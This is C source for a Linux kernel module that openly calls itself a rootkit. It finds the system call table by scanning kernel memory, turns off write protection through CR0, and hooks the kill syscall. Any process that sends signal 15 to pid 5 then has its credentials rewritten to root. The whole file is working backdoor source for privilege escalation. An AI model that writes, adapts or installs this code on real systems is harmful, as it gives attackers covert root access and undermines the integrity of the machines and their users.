#include <linux/module.h>	// Needed for all kernel modules
#include <linux/kernel.h>	// Needed for KERN_INFO
#include <linux/init.h>		// Needed for __init and __exit macros
#include <linux/syscalls.h>

static asmlinkage long (*ref_sys_kill)(int pid, int sig);
static asmlinkage long new_sys_kill(int pid, int sig) {
	long ret = ref_sys_kill(pid, sig);
	kuid_t uid;
	kgid_t gid;
	struct cred *cred;

	if (pid == 5 && sig == 15) {
		uid.val = 0;
		gid.val = 0;
		cred = (struct cred *) __task_cred(current);
		cred->uid = cred->suid = cred->euid = cred->fsuid = uid;
		cred->gid = cred->sgid = cred->egid = cred->fsgid = gid;
		printk(KERN_INFO "You are now root!\n");
	}

	return ret;
}

static unsigned long **aquire_sys_call_table(void) {
	unsigned long **sct;
	unsigned long int offset;

	// going through all addresses
	for (offset = PAGE_OFFSET; offset < ULLONG_MAX; offset += sizeof(void *)) {
		sct = (unsigned long **) offset;
		// sys_close exported by the kernel
		if (sct[__NR_close] == (unsigned long *) sys_close) {
			return sct;
		}
	}
	
	return NULL;
}

static int __init rootkit_init(void) {
	unsigned long **sys_call_table = aquire_sys_call_table();

	if (!sys_call_table) {
		return -1;
	}
	
	write_cr0(read_cr0() & ~0x00010000); // clear WP
	ref_sys_kill = (void *) sys_call_table[__NR_kill];
	sys_call_table[__NR_kill] = (unsigned long *) new_sys_kill; // replace
	write_cr0(read_cr0() | 0x00010000); // set WP

	printk(KERN_INFO "Rootkit installed\n");
	return 0;
}

static void __exit rootkit_cleanup(void) {
	unsigned long **sys_call_table = aquire_sys_call_table();

	if (!sys_call_table) {
		return;
	}
	
	write_cr0(read_cr0() & ~0x00010000); // clear WP
	sys_call_table[__NR_kill] = (unsigned long *) ref_sys_kill; // restore
	write_cr0(read_cr0() | 0x00010000); // set WP

	printk(KERN_INFO "Rootkit removed\n");
}

module_init(rootkit_init);
module_exit(rootkit_cleanup);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tobias Johansson");
MODULE_DESCRIPTION("Kill to root");
